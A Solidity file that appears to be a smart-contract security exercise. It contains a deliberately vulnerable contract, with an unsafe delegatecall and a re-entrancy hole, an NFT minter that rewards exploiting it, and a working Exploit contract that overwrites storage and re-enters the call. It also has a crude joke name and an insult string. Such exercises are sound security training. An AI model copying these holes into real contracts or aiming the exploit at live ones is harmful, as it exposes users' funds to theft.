// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface OtherContract{
    function getOwner() external view returns(address);
}

contract CourseCompletedNFT{
    string public constant TOKEN_IMAGE_URI =
        "ipfs://QmeHo8yoogtNC1aajU6Bn8HEWTGjfv8m7m8ZdDDUzNBXij";
    uint256 private s_tokenCounter;
    uint256 private s_otherVar;
    VulnerableContract private s_vulnerableContract;
    error CourseCompletedNFT__NotOwnerOfOtherContract();
    error CourseCompletedNFT__Nope();

    constructor(address vulnerableContractAddress)
       {
        s_tokenCounter = 0;
        s_vulnerableContract = VulnerableContract(vulnerableContractAddress);
    }

    function mintNft(address yourAddress, bytes4 selector) public returns (uint256) {
        if (OtherContract(yourAddress).getOwner() != msg.sender) {
            revert CourseCompletedNFT__NotOwnerOfOtherContract();
        }
        bool returnedOne = s_vulnerableContract.callContract(yourAddress);
        bool returnedTwo = s_vulnerableContract.callContractAgain(yourAddress, selector);

        if (!returnedOne && !returnedTwo) {
            revert CourseCompletedNFT__Nope();
        }

        s_tokenCounter = s_tokenCounter + 1;
        return s_tokenCounter;
    }

    function getTokenCounter() public view returns (uint256) {
        return s_tokenCounter;
    }
}

contract VulnerableContract {
    error CourseCompletedNFT__Nope();
    error VulnerableContract__Nope();
    error VulnerableContract__NopeCall();
    error CourseCompletedNFT__NotOwnerOfOtherContract();
    uint256 public s_variable = 0;
    uint256 public s_otherVar = 0;

    function callContract(address yourAddress) public returns (bool) {
        (bool success, ) = yourAddress.delegatecall(abi.encodeWithSignature("doSomething()"));
        //do something return true
        //edit 1st storage to be 123
        require(success);

        if (s_variable != 123) {
            revert VulnerableContract__NopeCall();
        }
        s_variable = 0;
        return true;
    }

    function callContractAgain(address yourAddress, bytes4 selector) public returns (bool) {
        //Re-Entrancy
        s_otherVar = s_otherVar + 1;
        (bool success, ) = yourAddress.call(
            abi.encodeWithSelector(selector)
        );
        require(success);

        if (s_otherVar == 2) {
            return true;
        }
        s_otherVar = 0;
        return false;
    }
}

contract Exploit{
    uint firstStorage;  //variable on first storage slot
    uint step=0; //re-entrancy counter

    function doSomething() public returns (bool){
        firstStorage = 123;
        return true;
    }

    function jokowi() public returns (bool, bytes memory){
        step = ++step;
        if(step%2 == 0){
            return (true, abi.encode(true));
        }
        VulnerableContract(msg.sender).callContractAgain(address(this), bytes4(keccak256("jokowi()")));
        bytes memory co = bytes('asu');
        return (true, co);
    }

    function getOwner() public view returns (address){
        return tx.origin;
    }

    //just a function to get the jokowi() selector bytes
    function lol() public pure returns(bytes4){
        return bytes4(keccak256("jokowi()"));
    }
}